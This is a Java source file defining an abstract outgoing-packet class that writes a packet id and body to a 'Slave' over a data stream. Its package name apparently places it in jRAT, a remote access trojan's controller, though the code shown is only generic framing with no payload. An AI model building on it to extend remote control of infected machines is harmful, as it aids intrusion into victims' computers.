package pro.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.client.Slave;
import pro.jrat.client.extensions.PluginEventHandler;
import pro.jrat.common.PacketRange;

public abstract class AbstractOutgoingPacket {

	public abstract void write(Slave slave, DataOutputStream dos) throws Exception;

	public abstract byte getPacketId();

	public synchronized final void send(Slave slave, DataOutputStream dos) {
		try {
			byte id = getPacketId();

			if (id < 0 || id > PacketRange.outgoingRange) {
				PluginEventHandler.onSendPacket(id, slave);
			}

			dos.writeByte(getPacketId());
			this.write(slave, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}